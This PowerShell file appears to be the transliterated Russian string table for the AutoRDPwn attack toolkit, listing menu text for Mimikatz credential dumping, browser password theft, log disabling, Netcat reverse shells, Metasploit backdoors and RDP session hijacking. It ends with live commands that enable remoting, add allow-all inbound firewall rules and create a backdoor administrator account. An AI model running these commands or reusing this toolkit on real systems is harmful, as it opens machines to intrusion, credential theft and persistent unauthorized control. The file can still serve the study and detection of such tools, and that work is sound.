[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
$txt1  = "Zagruzit' dopolnitel'nye moduli"
$txt2  = "Zakryt' programmu"
$txt3  = "Vasha versiya Powershell ne sovmestima s etim scenariem :("
$txt4  = "Vy mozhete skachat' poslednyuyu versiyu zdes'"
$txt5  = "Vasha operacionnaya sistema ne sovmestima s etoj atakoj"
$txt6  = "Nevernaya opciya, poprobujte eshche raz"
$txt7  = "Vyberite sposob zapuska ataki:` "
$txt8  = "Vyberite modul', kotoryj vy hotite zagruzit':` "
$txt9  = "Izvlekat' lokal'nye heshi s pomoshch'yu Mimikatz"
$txt10 = "Izvlech' sistemnye paroli s pomoshch'yu Mimikatz"
$txt11 = "Perestroit' kesh izobrazhenij"
$txt12 = "Poluchit' istoriyu udalennogo rabochego stola"
$txt13 = "Obnaruzhena sistema $system, zagruzhaetsya Mimikatz.."
$txt14 = "Perenapravit' lokal'nyj port"
$txt15 = "Perenapravit' udalennyj port"
$txt16 = "Proverit' fakticheskie perenapravleniya"
$txt17 = "Udalennyj dostup"
$txt18 = "Deaktivirovat' sistemnye zhurnaly"
$txt19 = "Etot process mozhet zanyat' neskol'ko minut.."
$txt20 = "Udalit' vse perenapravleniya"
$txt21 = "Modul' uspeshno zagruzhen!"
$txt22 = "Vernut'sya v glavnoe menyu"
$txt23 = "Kakoj IP-adres servera?:` "
$txt24 = "A pol'zovatel'?:` "
$txt25 = "Vvedite parol':` "
$txt26 = "Vvedite domen:` "
$txt27 = "Nakonec, hesh NTLM:` "
$txt28 = "Povyshenie privilegij s pomoshch'yu dublirovaniya tokena.."
$txt29 = "Vy hotite videt' ili kontrolirovat' komp'yuter?:` "
$txt30 = "Izmenenie razreshenij dlya prosmotra udalennogo komp'yutera.."
$txt31 = "Izmenenie razreshenij dlya upravleniya udalennym komp'yuterom.."
$txt32 = "Izmeneniya v reestre Windows sdelany uspeshno!"
$txt33 = "Opredelenie versii operacionnoj sistemy vklyucheno"
$txt34 = "Izmenenie razreshenij dlya vhoda bez uchetnyh dannyh.."
$txt35 = "Poisk aktivnyh seansov na komp'yutere.."
$txt36 = "K kakomu seansu vy hotite podklyuchit'sya?:` "
$txt37 = "obnaruzhil, primenyaya izmeneniya.."
$txt38 = "Zapusk udalennogo podklyucheniya!"
$txt39 = "Poluinteraktivnaya konsol' (WinRS)"
$txt40 = "CHto-to poshlo ne tak, zakryvaya programmu.."
$txt41 = "Vvedite lokal'nyj port:` "
$txt42 = "Kakoj interfejs vy hotite ispol'zovat'?:` "
$txt43 = "Vvedite udalennyj port:` "
$txt44 = "Nakonec, IP-adres naznacheniya:` "
$txt45 = "Perenapravlenie sozdano uspeshno!"
$txt46 = "Konfiguraciya uspeshno sohranena!"
$txt47 = "Net perenapravleniya dlya pokaza"
$txt48 = "Vse perenapravleniya byli udaleny"
$txt49 = "Poluchit' paroli brauzerov s pomoshch'yu SharpWeb"
$txt50 = "Paroli i heshi"
$txt51 = "Konsol' Netcat (pryamoe soedinenie)"
$txt52 = "Konsol' Netcat (obratnoe soedinenie)"
$txt53 = "Vvedite port dlya proslushivaniya:` "
$txt54 = "Vvedite udalennyj IP:` "
$txt55 = "Vvedite IP-adres ili diapazon seti:` "
$txt56 = "Vvedite skorost' skanirovaniya (1-5):` "
$txt57 = "Vvedite kolichestvo portov dlya skanirovaniya (25-1000):` "
$txt58 = "Ves' profil' pol'zovatelya"
$txt59 = "Vosstanovit' paroli Wi-Fi"
$txt60 = "Na etom komp'yutere net besprovodnoj seti"
$txt61 = "Poluchit' uchetnye dannye seansa RDP"
$txt62 = "Udalennyj VNC-server (ustarevshij)"
$txt63 = "Vstavit' v vashu konsol' Metasploit Framework:` "
$txt64 = "Bekdory i postoyanstvo"
$txt65 = "Vvedite IP-adres, na kotorom rabotaet MSF:` "
$txt66 = "Vse gotovo! Teper' vypolnite sleduyushchuyu komandu:` "
$txt67 = "Vypolnenie vneshnego skripta"
$txt68 = "Povyshenie privilegij"
$txt69 = "Drugie moduli"
$txt70 = "Poluchit' informaciyu ob operacionnoj sisteme"
$txt71 = "Poisk uyazvimostej s pomoshch'yu SHerloka"
$txt72 = "Povyshenie privilegij s pomoshch'yu PowerUp"
$txt73 = "Vvedite put' ili URL skripta:` "
$txt74 = "Napishite funkciyu, kotoruyu vy hotite vypolnit':` "
$txt75 = "Ozhidanie zakrytiya vsekh processov.."
$txt76 = "Ochistka vypolnena!"
$txt77 = "Otmena izmenenij na udalennom komp'yutere.."
$txt78 = "Vvedite imya pol'zovatelya:` "
$txt79 = "Izmenit' pol'zovatelya s pomoshch'yu RunAs"
$txt80 = "Proverka uchetnyh dannyh na lokal'nom komp'yutere.."
$txt81 = "Nevernye uchetnye dannye! Vozvrashchaemsya v glavnoe menyu.."
$txt82 = "Zagruzka AutoRDPwn s novym pol'zovatelem.."
$txt83 = "Vyberite metod proverki (hesh / parol'):` "
$txt84 = "Vvedite hesh NTLM:` "
$txt85 = "Vvedite protokol, kotoryj vy hotite ispol'zovat' (SMB / WMI):` "
$Pwn1  = "winrm quickconfig -force ; Enable-PSRemoting -Force"
$Pwn2  = "New-NetFirewallRule -DisplayName "ANY1" -Direction Inbound -Protocol Any -Action Allow"
$Pwn3  = "New-NetFirewallRule -DisplayName "ANY2" -Direction Inbound -Protocol Any -Action Allow"
$Pwn4  = "New-NetFirewallRule -DisplayName "ANY3" -Direction Inbound -Protocol Any -Action Allow"
$Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup admins AutoRDPwn /add"
$Pwn6 = "Agent seansa RDP"
